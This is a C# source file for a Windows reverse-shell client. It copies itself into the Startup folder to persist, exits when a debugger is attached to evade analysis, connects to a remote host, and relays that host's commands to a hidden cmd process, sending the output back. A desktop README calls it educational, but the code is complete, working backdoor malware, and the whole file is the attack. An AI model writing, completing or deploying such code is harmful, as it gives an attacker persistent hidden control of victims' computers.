using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using Extensions;

namespace RemoteShellClient;

public class RemoteShell
{
    private TcpClient _tcpClient = new();

    public RemoteShell()
    {
        CreateReadme();
        ConfigureAutorun();
        _ = Task.Run(CheckForDebugger);
    }

    private static void CreateReadme()
    {
        var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        const string readmeContent = "This program is used in educational purposes." +
                                     " To delete this program open startup folder and remove 'remoteshell.exe' file";
        File.WriteAllText(Path.Combine(desktopPath, "README.txt"), readmeContent);
    }
    
    private static void ConfigureAutorun()
    {
        var currentPath = Assembly.GetExecutingAssembly().Location;
        var path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        File.Copy(currentPath, Path.Combine(path, "remoteshell.exe"));
    }

    public async Task Connect(string ip, int port)
    {
        while (true)
        {
            try
            {
                await _tcpClient.ConnectAsync(IPAddress.Parse(ip), port);
                break;
            }
            catch
            {
                Console.WriteLine("Connection failed. Restarting...");
            }
        }

        await OnConnectionEstablished();
    }

    private static void CheckForDebugger()
    {
        while (!Debugger.IsAttached)
        {
            Thread.Sleep(TimeSpan.FromSeconds(5));
        }
        
        Environment.Exit(0);
    }

    private Process CreateCmd()
    {
        var process = new Process();
        var processStartInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            ErrorDialog = false,
            CreateNoWindow = true,
            UseShellExecute = false
        };
        process.OutputDataReceived += OnProcessDataReady;
        process.ErrorDataReceived += OnProcessDataReady;
        process.StartInfo = processStartInfo;
        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        return process;
    }

    private async Task OnConnectionEstablished()
    {
        var process = CreateCmd();
        
        while (_tcpClient.Connected)
        {
            var message = await _tcpClient.ReceiveMessageAsync();

            await process.StandardInput.WriteLineAsync(message);
            await process.StandardInput.FlushAsync();
        }
        
        process.Close();
    }

    private async void OnProcessDataReady(object sender, DataReceivedEventArgs e)
    {
        if (string.IsNullOrEmpty(e.Data))
            return;
        
        await _tcpClient.SendAsync(e.Data);
    }
}